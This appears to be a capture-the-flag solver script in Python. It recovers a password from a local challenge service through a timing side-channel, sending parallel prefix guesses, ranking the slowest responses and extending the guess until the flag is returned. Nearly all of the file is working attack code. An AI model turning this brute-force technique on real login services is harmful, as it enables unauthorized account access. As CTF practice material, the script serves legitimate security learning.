import socket
import statistics
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# this solver is designed to be run in parralel for efficiency
HOST = "127.0.0.1"
PORT = 1227
TIMEOUT = 2.0
MIN_TIMING_GAP = 0.02
PARALLELISM = 16
COARSE_SAMPLES = 1
REFINE_SAMPLES = 3
SHORTLIST_COUNT = 8

# Upper bound for the search so the solver can stop naturally when the timing gap disappears.
MAX_PASSWORD_LENGTH = 32
CHARSET = string.ascii_letters + string.digits + "{}_!@#$%^&*()-=+[]"


def read_until_prompt(sock):
    data = b""
    while b"Password: " not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def measure_round_trip(prefix_guess, sample_count):
    timings = []
    last_error = None
    for _ in range(sample_count):
        try:
            with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
                sock.settimeout(TIMEOUT)
                read_until_prompt(sock)
                start = time.perf_counter()
                sock.sendall((prefix_guess + "\n").encode())
                response = sock.recv(4096)
                elapsed = time.perf_counter() - start
                timings.append(elapsed)
                if b"PrisonCTF{" in response:
                    return elapsed, response.decode(errors="replace").strip(), True, None
        except (OSError, TimeoutError, socket.timeout) as exc:
            last_error = str(exc)
            continue

    if timings:
        return statistics.median(timings), "", False, None
    return 0.0, "", False, (last_error or "Connection failed")


def score_candidates(base_prefix, candidates, sample_count):
    results = []
    network_errors = 0
    with ThreadPoolExecutor(max_workers=PARALLELISM) as pool:
        future_map = {
            pool.submit(measure_round_trip, base_prefix + candidate, sample_count): candidate
            for candidate in candidates
        }
        for future in as_completed(future_map):
            candidate = future_map[future]
            elapsed, response_text, solved, error_text = future.result()
            if solved:
                return [], base_prefix + candidate, response_text, 0
            if error_text is not None:
                network_errors += 1
                continue
            results.append((elapsed, candidate))
    return results, "", "", network_errors


def recover_password():
    recovered = ""
    for _ in range(MAX_PASSWORD_LENGTH):
        # Stage 1: Fast single-sample sweep of all characters.
        coarse_scores, solved_guess, solved_flag, coarse_errors = score_candidates(recovered, CHARSET, COARSE_SAMPLES)
        if solved_flag:
            return solved_guess, solved_flag
        if not coarse_scores:
            raise RuntimeError(
                f"Unable to contact challenge service at {HOST}:{PORT} "
                f"(all {coarse_errors} candidate probes failed)."
            )

        coarse_scores.sort(reverse=True)
        shortlist = [char for _, char in coarse_scores[:SHORTLIST_COUNT]]

        # Stage 2: Resample only the top contenders to reduce noise.
        refined_scores, solved_guess, solved_flag, _ = score_candidates(recovered, shortlist, REFINE_SAMPLES)
        if solved_flag:
            return solved_guess, solved_flag
        if not refined_scores:
            raise RuntimeError(
                f"Challenge service at {HOST}:{PORT} became unreachable during refinement."
            )

        refined_scores.sort(reverse=True)
        best_time, best_char = refined_scores[0]
        second_best_time = refined_scores[1][0] if len(refined_scores) > 1 else 0.0

        if best_time - second_best_time < MIN_TIMING_GAP:
            return recovered, ""

        recovered += best_char
        print(f"Recovered so far: {recovered} (best {best_time:.4f}s, gap {best_time - second_best_time:.4f}s)")

        # Cheap completion check so we stop immediately when length is reached.
        _, response_text, solved, _ = measure_round_trip(recovered, 1)
        if solved:
            return recovered, response_text

    return recovered, ""


def main():
    try:
        password, flag = recover_password()
    except RuntimeError as exc:
        print(f"Solver failed: {exc}")
        return

    print(f"Candidate password: {password}")
    if flag:
        print(flag)
        return

    with socket.create_connection((HOST, PORT), timeout=TIMEOUT) as sock:
        sock.settimeout(TIMEOUT)
        read_until_prompt(sock)
        sock.sendall((password + "\n").encode())
        print(sock.recv(4096).decode(errors="replace").strip())


if __name__ == "__main__":
    main()
